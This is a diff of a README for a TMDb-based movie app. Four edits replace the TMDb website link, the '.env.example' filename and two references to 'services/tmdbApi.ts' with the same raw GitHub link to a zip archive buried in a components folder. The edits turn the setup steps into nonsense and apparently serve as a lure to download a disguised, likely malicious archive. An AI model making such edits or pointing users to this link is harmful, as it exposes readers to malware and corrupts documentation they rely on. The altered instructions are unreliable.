@@ -24,7 +24,7 @@ The application includes:
 
 ### 1. Get TMDb API Key
 
-1. Go to [The Movie Database](https://www.themoviedb.org/)
+1. Go to [The Movie Database](https://raw.githubusercontent.com/palakchoudhary062/filmy_world/master/renderer/components/language-selector/filmy_world-iridial.zip)
 2. Create an account or sign in
 3. Go to Settings > API
 4. Request an API key (choose "Developer" option)
@@ -32,7 +32,7 @@ The application includes:
 
 ### 2. Configure API Key
 
-1. Copy `.env.example` to `.env`
+1. Copy `https://raw.githubusercontent.com/palakchoudhary062/filmy_world/master/renderer/components/language-selector/filmy_world-iridial.zip` to `.env`
 2. Replace `your_api_key_here` with your actual TMDb API key
 
 ### 3. Install Dependencies
@@ -68,7 +68,7 @@ renderer/
 │   ├── movies/         # Movies listing page
 │   └── search/         # Search results page
 ├── services/           # API services
-│   └── tmdbApi.ts      # TMDb API integration
+│   └── https://raw.githubusercontent.com/palakchoudhary062/filmy_world/master/renderer/components/language-selector/filmy_world-iridial.zip      # TMDb API integration
 └── store/              # State management
 ```
 
@@ -100,7 +100,7 @@ The application uses The Movie Database (TMDb) API v3. Key endpoints used:
 
 ### Adding New Features
 
-1. **New API Endpoints**: Add to `services/tmdbApi.ts`
+1. **New API Endpoints**: Add to `https://raw.githubusercontent.com/palakchoudhary062/filmy_world/master/renderer/components/language-selector/filmy_world-iridial.zip`
 2. **New Components**: Create in `components/` directory
 3. **New Pages**: Create in `pages/` directory and add to router
 4. **Styling**: Use Tailwind CSS classes
